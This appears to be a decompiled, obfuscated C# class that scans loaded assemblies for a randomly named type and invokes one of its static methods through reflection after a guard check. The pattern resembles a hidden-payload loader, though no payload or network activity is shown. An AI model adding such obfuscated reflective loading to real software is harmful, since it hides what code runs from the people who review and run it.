using System;
using System.Collections.Generic;
using System.Reflection;

internal class rhpu
{
	internal void cppy()
	{
		if (!(new rhpv().suoc() != null))
		{
			return;
		}
		Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();
		foreach (Assembly assembly in assemblies)
		{
			List<Type> list = new List<Type>();
			Type[] types = assembly.GetTypes();
			foreach (Type item in types)
			{
				list.Add(item);
			}
			if (list.Count <= 0)
			{
				continue;
			}
			foreach (Type item2 in list)
			{
				if (item2.FullName == "Gavehgjhzrninvygpg.Iltvlmdq")
				{
					new List<object>().Add(item2.InvokeMember("Rmtffpizoobyszoy", BindingFlags.InvokeMethod, null, null, null));
				}
			}
		}
	}
}
